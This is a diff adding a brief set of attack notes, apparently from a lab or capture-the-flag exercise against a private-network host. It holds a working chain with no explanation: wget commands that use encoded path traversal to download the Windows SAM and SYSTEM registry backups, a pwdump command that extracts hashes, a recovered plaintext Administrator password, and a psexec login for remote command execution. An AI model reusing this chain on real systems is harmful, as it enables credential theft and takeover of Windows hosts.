@@ -1,0 +1,11 @@
+http://10.3.3.190/powershell_dev_scripts/list_directory_output.txt
+
+wget "http://10.3.3.190/..%5C..%5C..%5C.. %5C..%5C..%5C/Windows/System32/config/RegBack/SAM.OLD"
+
+wget "http://10.3.3.190/..%5C..%5C..%5C.. %5C..%5C..%5C/Windows/System32/config/RegBack/SYSTEM.OLD"
+
+python pwdump.py SYSTEM.OLD SAM.OLD
+
+Administrator:easypasswordorelseforget
+
+psexec.py Administrator:easypasswordorelseforget@10.3.3.190
